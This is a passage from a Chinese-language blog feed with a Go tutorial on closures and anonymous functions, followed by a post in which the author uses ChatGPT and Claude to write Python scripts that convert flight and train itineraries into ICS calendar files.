之后的语句改变。</p></li></ul><h2 id="Go语言中的闭包"><a href="#Go语言中的闭包" class="headerlink" title="Go语言中的闭包"></a>Go语言中的闭包</h2><p> Go 语言的闭包就是一个引用了<strong>外部自由变量</strong>的<strong>匿名函数</strong>，被引用的自由变量和该匿名函数共同存在，不会因为离开了外部环境就被<strong>释放或者删除</strong>，还可以在这个匿名函数中继续使用。</p><h3 id="1-Go语言的匿名函数"><a href="#1-Go语言的匿名函数" class="headerlink" title="1. Go语言的匿名函数"></a>1. Go语言的匿名函数</h3><p><strong>匿名函数</strong>，顾名思义，就是隐藏函数名的函数。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<br><br><span class="hljs-keyword">import</span> <span class="hljs-string">&quot;fmt&quot;</span><br><br><span class="hljs-comment">// 定义一个函数类型，值为一个匿名函数的变量；</span><br><span class="hljs-keyword">var</span> f = <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">()</span></span> &#123;<br>fmt.Println(<span class="hljs-string">&quot;匿名函数作为变量来使用&quot;</span>)<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>f() <span class="hljs-comment">// 使用这个匿名函数</span><br><br><span class="hljs-comment">// 定义一个匿名函数。在这个函数后加上()，就可以直接使用这个匿名函数。</span><br><span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">()</span></span> &#123;<br>fmt.Println(<span class="hljs-string">&quot;匿名函数直接使用&quot;</span>) <br>&#125;()<br>&#125;<br><br></code></pre></td></tr></table></figure><p>输出结果</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs">匿名函数作为变量来使用<br>匿名函数直接使用<br></code></pre></td></tr></table></figure><h3 id="2-匿名函数引用外部变量"><a href="#2-匿名函数引用外部变量" class="headerlink" title="2. 匿名函数引用外部变量"></a>2. 匿名函数引用外部变量</h3><p>如果在匿名函数内，使用了<strong>外部环境的变量</strong>，就构成了一个闭包。即一个函数内，使用匿名函数来操作函数内声明的变量。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<br><br><span class="hljs-keyword">import</span> <span class="hljs-string">&quot;fmt&quot;</span><br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>str := <span class="hljs-string">&quot;Hello Golang!&quot;</span><br><span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">()</span></span> &#123;<br>str = <span class="hljs-string">&quot;Hello Go!&quot;</span> <span class="hljs-comment">// 匿名函数直接操作了main函数之中的变量str</span><br>&#125;()<br>fmt.Println(str)<br>&#125;<br><br></code></pre></td></tr></table></figure><p>输出结果</p><figure class="highlight erlang-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs erlang-repl">Hello Go!<br></code></pre></td></tr></table></figure><p>上述例子简单的构造了一个闭包，在匿名函数中并没有声明或者定义str这个变量，但是可以直接操作，引用可main函数中的自由变量。</p><p>使用defer和闭包相结合，深入了解一下闭包中的引用外部变量。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<br><br><span class="hljs-keyword">import</span> <span class="hljs-string">&quot;fmt&quot;</span><br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>str := <span class="hljs-string">&quot;Hello Golang!&quot;</span><br><span class="hljs-keyword">defer</span> <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">()</span></span> &#123;<br>fmt.Println(<span class="hljs-string">&quot;defer str=&quot;</span>, str)<br>&#125;()<br>str = <span class="hljs-string">&quot;Hello Go!&quot;</span><br>fmt.Println(<span class="hljs-string">&quot;main str=&quot;</span>, str)<br>&#125;<br><br></code></pre></td></tr></table></figure><p>输出结果</p><figure class="highlight axapta"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs axapta">main <span class="hljs-built_in">str</span>= Hello Go!<br>defer <span class="hljs-built_in">str</span>= Hello Go!<br></code></pre></td></tr></table></figure><p>学习defer的时候有了解到 defer 后变量是保留它在 defer 时的值，而不会被 defer 之后的代码改变，但是在这闭包的情况下，看起来defer的值已经被改变了，其实原因是闭包是 <strong>引用</strong>了这个变量，即 defer 时被保留下来的是这个 <strong>变量的地址</strong> ，后续代码改变的不是地址，而是这个地址存储的值，所以后续代码对这个变量的操作，都会反应到defer中。</p><h3 id="3-总结-1"><a href="#3-总结-1" class="headerlink" title="3. 总结"></a>3. 总结</h3><ul><li>闭包就是匿名函数<strong>引用外部变量</strong></li><li>闭包中引用的变量会<strong>被外部环境改变</strong>，同时闭包内对变量的改变<strong>也会影响到外部环境</strong>的使用</li></ul><h2 id="参考来源"><a href="#参考来源" class="headerlink" title="参考来源"></a>参考来源</h2><p><a href="http://www.imooc.com/wiki/golesson/">http://www.imooc.com/wiki/golesson/</a></p>]]></content>
    
    
    <categories>
      
      <category>code</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Go</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>让Chatgpt帮我写代码(一)</title>
    <link href="/2023/04/22/%E8%AE%A9Chatgpt%E5%B8%AE%E6%88%91%E5%86%99%E4%BB%A3%E7%A0%81(%E4%B8%80)/"/>
    <url>/2023/04/22/%E8%AE%A9Chatgpt%E5%B8%AE%E6%88%91%E5%86%99%E4%BB%A3%E7%A0%81(%E4%B8%80)/</url>
    
    <content type="html"><![CDATA[<h2 id="一、起因"><a href="#一、起因" class="headerlink" title="一、起因"></a>一、起因</h2><p>今天在刷牙的时候看了一眼携程app上订的旅游的航班和高铁班次，发现不知什么时候携程把行程同步到日历的功能给下线了… </p><p>但对于我这种习惯了用日历或者提醒功能的人，行程没法通过日历主动提醒，就觉得缺了啥东西。 于是上网搜了搜如何把行程同步到日历上。</p><p>后来在知乎上看到了一个人把航班信息发给chatgpt，让它给我直接生成ics文件，然后用mac直接打开就能生成日历了。我也试了下，如下</p><p><img src="/../img/%E8%AE%A9Chatgpt%E5%B8%AE%E6%88%91%E5%86%99%E4%BB%A3%E7%A0%81(%E4%B8%80)/image-20230422225021493.png" alt="chatgpt将航班信息转化为ICS文件格式"></p><p>打开日历确实能够实现想要的效果，同样的手机上也正常显示。</p><p><img src="/../img/%E8%AE%A9Chatgpt%E5%B8%AE%E6%88%91%E5%86%99%E4%BB%A3%E7%A0%81(%E4%B8%80)/image-20230422225145244.png" alt="日历显示"></p><p>既然如此，那就可以直接让chatgpt帮我用写个脚本，下次直接填行程就行。 说干就干。</p><h2 id="二、Chatgpt上场"><a href="#二、Chatgpt上场" class="headerlink" title="二、Chatgpt上场"></a>二、Chatgpt上场</h2><h3 id="2-1-航班信息"><a href="#2-1-航班信息" class="headerlink" title="2.1 航班信息"></a>2.1 航班信息</h3><p>我先重复了让它帮我生成ics的操作，然后再说出我的需求</p><p><img src="/../img/%E8%AE%A9Chatgpt%E5%B8%AE%E6%88%91%E5%86%99%E4%BB%A3%E7%A0%81(%E4%B8%80)/image-20230422225543534.png" alt="将需求告诉它"></p><p>然后将代码放入代码编辑器中运行，果不其然报错了</p><p><img src="/../img/%E8%AE%A9Chatgpt%E5%B8%AE%E6%88%91%E5%86%99%E4%BB%A3%E7%A0%81(%E4%B8%80)/image-20230422225728727.png" alt="代码报错"></p><p>直接丢给chatgpt，让它给我优化（我懒）</p><p><img src="/../img/%E8%AE%A9Chatgpt%E5%B8%AE%E6%88%91%E5%86%99%E4%BB%A3%E7%A0%81(%E4%B8%80)/image-20230422225909046.png" alt="chatgpt给的排错建议"></p><p>不出意外的已经把错误打印出来了</p><p>ValueError: time data ‘2023&#x2F;05&#x2F;041 5:20’ does not match format ‘%Y&#x2F;%m&#x2F;%d %H:%M’</p><p>这个错误提示表明时间格式不符合预期，可能是时间字符串中有一个多余的字符或者缺少一个字符。</p><p>原来是为填写时间时候，出错了，把2023&#x2F;05&#x2F;04 15:20 写成 2023&#x2F;05&#x2F;041 5:20 了。</p><p>最后查看result.ics打开验证是否能被日历功能正常读取。</p><p>生成的代码如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> datetime <span class="hljs-keyword">import</span> datetime, timedelta<br><span class="hljs-keyword">import</span> re<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">convert_flight_to_ics</span>(<span class="hljs-params">flight_info</span>):<br>    regex = <span class="hljs-string">r&quot;(\S+)\s+(\S+)\s+出发时间\s+(\S+\s+\S+)\s+(\S+)\s+达到时间\s+(\S+\s+\S+)&quot;</span><br>    <span class="hljs-keyword">match</span> = re.search(regex, flight_info)<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">match</span> <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Error: failed to match flight information.&quot;</span>)<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span><br>    airline, dep_airport, dep_time, arr_airport, arr_time = <span class="hljs-keyword">match</span>.groups()<br><br>    <span class="hljs-comment"># 生成ICS字符串</span><br>    start_time = datetime.strptime(dep_time, <span class="hljs-string">&#x27;%Y/%m/%d %H:%M&#x27;</span>)<br>    end_time = datetime.strptime(arr_time, <span class="hljs-string">&#x27;%Y/%m/%d %H:%M&#x27;</span>)<br>    uid = <span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;airline&#125;</span>-<span class="hljs-subst">&#123;start_time.date()&#125;</span>&#x27;</span><br>    ics_str = <span class="hljs-string">f&#x27;BEGIN:VCALENDAR\nVERSION:2.0\nPRODID:-//ChatGPT//Flight Schedule//EN\nBEGIN:VEVENT\nUID:<span class="hljs-subst">&#123;uid&#125;</span>\nDTSTAMP:<span class="hljs-subst">&#123;datetime.utcnow().strftime(<span class="hljs-string">&quot;%Y%m%dT%H%M%SZ&quot;</span>)&#125;</span>\nDTSTART;TZID=Asia/Shanghai:<span class="hljs-subst">&#123;start_time.strftime(<span class="hljs-string">&quot;%Y%m%dT%H%M%S&quot;</span>)&#125;</span>\nDTEND;TZID=Asia/Shanghai:<span class="hljs-subst">&#123;end_time.strftime(<span class="hljs-string">&quot;%Y%m%dT%H%M%S&quot;</span>)&#125;</span>\nSUMMARY:航班 <span class="hljs-subst">&#123;airline&#125;</span>\nLOCATION:<span class="hljs-subst">&#123;dep_airport&#125;</span>\nDESCRIPTION:<span class="hljs-subst">&#123;airline&#125;</span> 将于<span class="hljs-subst">&#123;dep_time&#125;</span>从<span class="hljs-subst">&#123;dep_airport&#125;</span>出发，预计于<span class="hljs-subst">&#123;arr_time&#125;</span>到达<span class="hljs-subst">&#123;arr_airport&#125;</span>。\nEND:VEVENT\nEND:VCALENDAR&#x27;</span><br><br>    <span class="hljs-keyword">return</span> ics_str<br><br><span class="hljs-comment"># 读取航班信息</span><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;Flight.txt&#x27;</span>, <span class="hljs-string">&#x27;r&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>    flight_info = f.read()<br><br><span class="hljs-comment"># 转换为ICS字符串</span><br>ics_str = convert_flight_to_ics(flight_info)<br><br><span class="hljs-comment"># 将ICS字符串写入文件</span><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;result.ics&#x27;</span>, <span class="hljs-string">&#x27;w&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>    f.write(ics_str)<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;转换完成！请查看对应目录的result.ics文件&#x27;</span>)<br><br></code></pre></td></tr></table></figure><h3 id="2-2-高铁信息"><a href="#2-2-高铁信息" class="headerlink" title="2.2 高铁信息"></a>2.2 高铁信息</h3><p>现在解决了航班信息，突然想到还有高铁信息也需要，本次目的是chatgpt帮我写代码，所以我将上面的代码发送给他，增加了需求</p><p><img src="/../img/%E8%AE%A9Chatgpt%E5%B8%AE%E6%88%91%E5%86%99%E4%BB%A3%E7%A0%81(%E4%B8%80)/image-20230422231858210.png" alt="新增需求"></p><p>生成的代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> datetime <span class="hljs-keyword">import</span> datetime, timedelta<br><span class="hljs-keyword">import</span> re<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">convert_to_ics</span>(<span class="hljs-params">travel_info</span>):<br>    regex = <span class="hljs-string">r&quot;(\S+)\s+(\S+)\s+出发时间\s+(\S+\s+\S+)\s+(\S+)\s+达到时间\s+(\S+\s+\S+)&quot;</span><br>    train_regex = <span class="hljs-string">r&quot;(\S+)\s+(\S+)\s+出发时间\s+(\S+\s+\S+)\s+(\S+)\s+到达时间\s+(\S+\s+\S+)&quot;</span><br>    <span class="hljs-keyword">match</span> = re.search(regex, travel_info)<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">match</span> <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:<br>        <span class="hljs-keyword">match</span> = re.search(train_regex, travel_info)<br>        <span class="hljs-keyword">if</span> <span class="hljs-keyword">match</span> <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Error: failed to match travel information.&quot;</span>)<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span><br>        travel_type = <span class="hljs-string">&quot;高铁/动车&quot;</span><br>        train_no, dep_station, dep_time, arr_station, arr_time = <span class="hljs-keyword">match</span>.groups()<br>    <span class="hljs-keyword">else</span>:<br>        travel_type = <span class="hljs-string">&quot;航班&quot;</span><br>        airline, dep_airport, dep_time, arr_airport, arr_time = <span class="hljs-keyword">match</span>.groups()<br><br>    <span class="hljs-comment"># 生成ICS字符串</span><br>    start_time = datetime.strptime(dep_time, <span class="hljs-string">&#x27;%Y/%m/%d %H:%M&#x27;</span>)<br>    end_time = datetime.strptime(arr_time, <span class="hljs-string">&#x27;%Y/%m/%d %H:%M&#x27;</span>)<br>    uid = <span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;travel_type&#125;</span>-<span class="hljs-subst">&#123;start_time.date()&#125;</span>&#x27;</span><br>    <span class="hljs-keyword">if</span> travel_type == <span class="hljs-string">&quot;航班&quot;</span>:<br>        summary = <span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;airline&#125;</span> <span class="hljs-subst">&#123;uid&#125;</span>&#x27;</span><br>        location = dep_airport<br>        description = <span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;airline&#125;</span> 将于<span class="hljs-subst">&#123;dep_time&#125;</span>从<span class="hljs-subst">&#123;dep_airport&#125;</span>出发，预计于<span class="hljs-subst">&#123;arr_time&#125;</span>到达<span class="hljs-subst">&#123;arr_airport&#125;</span>。&#x27;</span><br>    <span class="hljs-keyword">elif</span> travel_type == <span class="hljs-string">&quot;高铁/动车&quot;</span>:<br>        summary = <span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;train_no&#125;</span> <span class="hljs-subst">&#123;uid&#125;</span>&#x27;</span><br>        location = dep_station<br>        description = <span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;train_no&#125;</span> 将于<span class="hljs-subst">&#123;dep_time&#125;</span>从<span class="hljs-subst">&#123;dep_station&#125;</span>出发，预计于<span class="hljs-subst">&#123;arr_time&#125;</span>到达<span class="hljs-subst">&#123;arr_station&#125;</span>。&#x27;</span><br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">raise</span> ValueError(<span class="hljs-string">&quot;Unknown travel type.&quot;</span>)<br><br>    ics_str = <span class="hljs-string">f&#x27;BEGIN:VCALENDAR\nVERSION:2.0\nPRODID:-//ChatGPT//Travel Schedule//EN\nBEGIN:VEVENT\nUID:<span class="hljs-subst">&#123;uid&#125;</span>\nDTSTAMP:<span class="hljs-subst">&#123;datetime.utcnow().strftime(<span class="hljs-string">&quot;%Y%m%dT%H%M%SZ&quot;</span>)&#125;</span>\nDTSTART;TZID=Asia/Shanghai:<span class="hljs-subst">&#123;start_time.strftime(<span class="hljs-string">&quot;%Y%m%dT%H%M%S&quot;</span>)&#125;</span>\nDTEND;TZID=Asia/Shanghai:<span class="hljs-subst">&#123;end_time.strftime(<span class="hljs-string">&quot;%Y%m%dT%H%M%S&quot;</span>)&#125;</span>\nSUMMARY:<span class="hljs-subst">&#123;summary&#125;</span>\nLOCATION:<span class="hljs-subst">&#123;location&#125;</span>\nDESCRIPTION:<span class="hljs-subst">&#123;description&#125;</span>\nEND:VEVENT\nEND:VCALENDAR&#x27;</span><br><br>    <span class="hljs-keyword">return</span> ics_str<br><br><br><span class="hljs-comment"># 读取行程信息</span><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;Flight.txt&#x27;</span>, <span class="hljs-string">&#x27;r&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>    travel_info = f.read()<br><br><span class="hljs-comment"># 转换为ICS字符串</span><br>ics_str = convert_to_ics(travel_info)<br><br><span class="hljs-comment"># 将ICS字符串写入文件</span><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;result.ics&#x27;</span>, <span class="hljs-string">&#x27;w&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>    f.write(ics_str)<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;转换完成！请查看对应目录的result.ics文件&#x27;</span>)<br><br></code></pre></td></tr></table></figure><p>根据代码最后生成的结果出了点小bug</p><p>高铁信息最后在rusult.ics中为 UID:航班-2023-05-02，其中应为UID:高铁&#x2F;动车-2023-05-02</p><p>将错误反馈给chatgpt，继续改～</p><p><img src="/../img/%E8%AE%A9Chatgpt%E5%B8%AE%E6%88%91%E5%86%99%E4%BB%A3%E7%A0%81(%E4%B8%80)/image-20230422235008815.png" alt="chagpt排错"></p><p>原来是我Flight.txt中的“到达时间”写成了“达到时间”，我的锅！ 错怪了你 chatgpt。</p><p>修改后，就能正常生成了。</p><h2 id="三、-Claude"><a href="#三、-Claude" class="headerlink" title="三、 Claude"></a>三、 <strong>Claude</strong></h2><h3 id="3-1-航班信息"><a href="#3-1-航班信息" class="headerlink" title="3.1 航班信息"></a>3.1 航班信息</h3><p>顺便试试Claude的代码能力。 告知他的需求</p><p><img src="/../img/%E8%AE%A9Chatgpt%E5%B8%AE%E6%88%91%E5%86%99%E4%BB%A3%E7%A0%81(%E4%B8%80)/image-20230423000312217.png" alt="告知需求"></p><p>最终生成的效果如下，未能识别</p><p><img src="/../img/%E8%AE%A9Chatgpt%E5%B8%AE%E6%88%91%E5%86%99%E4%BB%A3%E7%A0%81(%E4%B8%80)/image-20230423001749390.png" alt="未能识别"></p><p>将问题反馈给Claude</p><p><img src="/../img/%E8%AE%A9Chatgpt%E5%B8%AE%E6%88%91%E5%86%99%E4%BB%A3%E7%A0%81(%E4%B8%80)/image-20230423001828794.png" alt="反馈排错"></p><p>继续跟它对话，可以按照它的操作来，也可以直接告诉它，把修改后的代码发给你</p><p><img src="/../img/%E8%AE%A9Chatgpt%E5%B8%AE%E6%88%91%E5%86%99%E4%BB%A3%E7%A0%81(%E4%B8%80)/image-20230423001942913.png" alt="整理代码"></p><p>使用修改后的代码继续尝试，还是没达到效果，将输出结果发给它，继续调整</p><p><img src="/../img/%E8%AE%A9Chatgpt%E5%B8%AE%E6%88%91%E5%86%99%E4%BB%A3%E7%A0%81(%E4%B8%80)/image-20230423002235114.png" alt="继续优化代码"></p><p>经过比多次调教，最终给出代码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> datetime<br><span class="hljs-keyword">import</span> logging<br><br>ics = <span class="hljs-string">&quot;BEGIN:VCALENDAR\n&quot;</span><br>ics += <span class="hljs-string">&quot;PRODID:flight\n&quot;</span><br>ics += <span class="hljs-string">&quot;VERSION:2.0\n&quot;</span><br>ics += <span class="hljs-string">&quot;CALSCALE:GREGORIAN\n&quot;</span><br><br>flight_info = []<br>event_count = <span class="hljs-number">0</span><br><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;demo.txt&#x27;</span>, <span class="hljs-string">&#x27;r&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>    content = f.read().strip()<br>    flights = content.split(<span class="hljs-string">&quot;\n\n&quot;</span>)<br>    <span class="hljs-keyword">for</span> flight <span class="hljs-keyword">in</span> flights:<br>        flight_info = flight.split(<span class="hljs-string">&quot;\n&quot;</span>)<br><br>        <span class="hljs-comment"># 打印航班信息,确认是否准确</span><br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;航班信息: <span class="hljs-subst">&#123;flight_info&#125;</span>&quot;</span>)<br><br>        name = flight_info[<span class="hljs-number">0</span>]<br>        <span class="hljs-comment"># 打印航班名称</span><br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;name: <span class="hljs-subst">&#123;name&#125;</span>&quot;</span>)<br><br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(flight_info) &lt; <span class="hljs-number">5</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;航班信息不完整!&quot;</span>)<br>            <span class="hljs-keyword">continue</span><br><br>        <span class="hljs-comment"># 解析出机场和时间信息</span><br>        airport = flight_info[<span class="hljs-number">1</span>].split(<span class="hljs-string">&#x27; &#x27;</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;起飞机场: <span class="hljs-subst">&#123;airport[<span class="hljs-number">0</span>]&#125;</span>&quot;</span>)<br>        depart_airport = <span class="hljs-string">&#x27; &#x27;</span>.join(airport[:<span class="hljs-number">2</span>])<br><br>        depart_time = flight_info[<span class="hljs-number">2</span>]<br>        depart_time = datetime.datetime.strptime(depart_time, <span class="hljs-string">&#x27;%Y-%m-%d %H:%M&#x27;</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;起飞时间: <span class="hljs-subst">&#123;depart_time&#125;</span>&quot;</span>)<br><br>        airport = flight_info[<span class="hljs-number">3</span>].split(<span class="hljs-string">&#x27; &#x27;</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;到达机场: <span class="hljs-subst">&#123;airport[<span class="hljs-number">0</span>]&#125;</span>&quot;</span>)<br>        arrive_airport = <span class="hljs-string">&#x27; &#x27;</span>.join(airport[:<span class="hljs-number">2</span>])<br><br>        arrive_time = flight_info[<span class="hljs-number">4</span>]<br>        arrive_time = datetime.datetime.strptime(arrive_time, <span class="hljs-string">&#x27;%Y-%m-%d %H:%M&#x27;</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;到达时间: <span class="hljs-subst">&#123;arrive_time&#125;</span>&quot;</span>)<br><br>        <span class="hljs-comment"># 生成VEVENT事件</span><br>        <span class="hljs-keyword">try</span>:<br>            ics += <span class="hljs-string">f&quot;BEGIN:VEVENT\n&quot;</span><br>            ics += <span class="hljs-string">f&quot;UID:<span class="hljs-subst">&#123;name&#125;</span>@<span class="hljs-subst">&#123;depart_airport&#125;</span>@<span class="hljs-subst">&#123;arrive_airport&#125;</span>\n&quot;</span><br>            ics += <span class="hljs-string">f&quot;DTSTART;TZID=Asia/Shanghai:<span class="hljs-subst">&#123;depart_time.strftime(<span class="hljs-string">&#x27;%Y%m%dT%H%M%S&#x27;</span>)&#125;</span>\n&quot;</span><br>            ics += <span class="hljs-string">f&quot;DTEND;TZID=Asia/Shanghai:<span class="hljs-subst">&#123;arrive_time.strftime(<span class="hljs-string">&#x27;%Y%m%dT%H%M%S&#x27;</span>)&#125;</span>\n&quot;</span><br>            ics += <span class="hljs-string">f&quot;SUMMARY:<span class="hljs-subst">&#123;name&#125;</span>\n&quot;</span><br>            ics += <span class="hljs-string">f&quot;LOCATION:<span class="hljs-subst">&#123;depart_airport&#125;</span> -&gt; <span class="hljs-subst">&#123;arrive_airport&#125;</span>\n&quot;</span><br>            ics += <span class="hljs-string">&quot;END:VEVENT\n&quot;</span><br><br>            event_count += <span class="hljs-number">1</span><br><br>        <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;生成VEVENT失败:<span class="hljs-subst">&#123;e&#125;</span>&quot;</span>)<br>            logging.exception(e)<br><br>ics += <span class="hljs-string">&quot;END:VCALENDAR&quot;</span><br><br><span class="hljs-comment"># 如果成功生成了至少一个事件，就写入文件</span><br><span class="hljs-keyword">if</span> event_count &gt; <span class="hljs-number">0</span>:<br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;result.ics&#x27;</span>, <span class="hljs-string">&#x27;w&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>        f.write(ics)<br><span class="hljs-keyword">else</span>:<br>    <span class="hljs-built_in">print</span>(<span 